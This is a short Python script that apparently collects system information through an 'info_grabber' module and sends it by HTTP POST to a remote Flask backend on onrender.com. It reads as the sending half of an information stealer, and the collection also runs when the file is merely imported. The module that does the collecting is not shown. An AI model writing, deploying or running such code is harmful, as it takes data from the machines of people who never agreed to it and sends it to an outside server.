import requests
from info_grabber import SystemInfoCollector

api_url = "https://ipg-backend-flask.onrender.com/data"

extracted_data = SystemInfoCollector().embed_all()

if __name__=="__main__":
    
    extracted_data = SystemInfoCollector().embed_all()
    data = {'data': extracted_data}
    
    response = requests.post(api_url, json=data)
        
    if response.status_code == 200:
        print(">> sent successfully")
    else:
        print(f">> request failed : {response.status_code}")